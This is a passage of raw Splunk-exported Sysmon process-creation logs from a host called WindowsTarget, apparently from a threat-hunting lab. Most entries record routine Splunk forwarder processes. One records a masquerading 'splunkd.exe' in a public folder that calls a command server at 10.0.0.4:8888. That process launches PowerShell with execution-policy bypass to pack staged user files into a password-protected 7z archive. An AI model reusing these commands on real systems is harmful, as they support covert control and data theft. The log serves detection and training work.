Name='ParentUser'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T17:01:24.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99972,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99972,main,1,,,,,,,,,,,,,"PowerShell.EXE","Microsoft Windows","""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red","splunkd.exe","{8e02ef74-585e-675b-6007-000000002a00}",11700,"splunkd.exe","C:\Users\Public\splunkd.exe",,,,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""","C:\Users\inf808\Desktop\","powershell.exe","{8e02ef74-5d34-675b-7008-000000002a00}","MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",2400,High,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2","-",WindowsTarget,,,,,"C:\Windows\system32\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:16.951</Data><Data Name='ProcessGuid'>{8e02ef74-5d2c-675b-6f08-000000002a00}</Data><Data Name='ProcessId'>11508</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99971,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",,,CF14D28467DD4FEF75398156A8E6A19A,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,D925619A15C4DB19DBDBA44C5322F8F8,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5d2c-675b-6f08-000000002a00}","'3780'",11508,,,,"-",,,,,,99971,99971,,,,,"-",,849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:16.9525368Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:16.9525368Z'/><EventRecordID>99971</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:01:16.9525368Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:16.951",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:16.9525368Z'/><EventRecordID>99971</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:16.951</Data><Data Name='ProcessGuid'>{8e02ef74-5d2c-675b-6f08-000000002a00}</Data><Data Name='ProcessId'>11508</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:01:16.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99971,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99971,main,1,,,,,,,,,,,,,,"Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2","C:\Windows\system32\","splunk-powershell.exe","{8e02ef74-5d2c-675b-6f08-000000002a00}","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",11508,System,"splunk-powershell.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""","Splunk Inc.",WindowsTarget,,,,,"C:\Windows\system32\","Registry monitor",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:16.172</Data><Data Name='ProcessGuid'>{8e02ef74-5d2c-675b-6e08-000000002a00}</Data><Data Name='ProcessId'>10264</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Registry monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-regmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99970,,,"9.3.2",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B",,,49E336D7B9A7A129F5B660D2C45C636B,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,E7432FD0BE0FB381CA5F91DC60C988B3,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"splunk-regmon.exe",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5d2c-675b-6e08-000000002a00}","'3780'",10264,,,,"splunk Application",,,,,,99970,99970,,,,,"-",,5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:16.1742865Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:16.1742865Z'/><EventRecordID>99970</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:01:16.1742865Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:16.172",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:16.1742865Z'/><EventRecordID>99970</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:16.172</Data><Data Name='ProcessGuid'>{8e02ef74-5d2c-675b-6e08-000000002a00}</Data><Data Name='ProcessId'>10264</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Registry monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-regmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:01:16.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99970,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99970,main,1,,,,,,,,,,,,,"splunk-regmon.exe","Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""","C:\Windows\system32\","splunk-regmon.exe","{8e02ef74-5d2c-675b-6e08-000000002a00}","MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B",10264,System,"splunk-regmon.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""","-",WindowsTarget,,,,,"C:\Windows\system32\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:15.300</Data><Data Name='ProcessGuid'>{8e02ef74-5d2b-675b-6d08-000000002a00}</Data><Data Name='ProcessId'>10868</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99969,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",,,CF14D28467DD4FEF75398156A8E6A19A,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,D925619A15C4DB19DBDBA44C5322F8F8,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5d2b-675b-6d08-000000002a00}","'3780'",10868,,,,"-",,,,,,99969,99969,,,,,"-",,849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:15.3023683Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:15.3023683Z'/><EventRecordID>99969</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:01:15.3023683Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:15.300",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:15.3023683Z'/><EventRecordID>99969</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:15.300</Data><Data Name='ProcessGuid'>{8e02ef74-5d2b-675b-6d08-000000002a00}</Data><Data Name='ProcessId'>10868</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-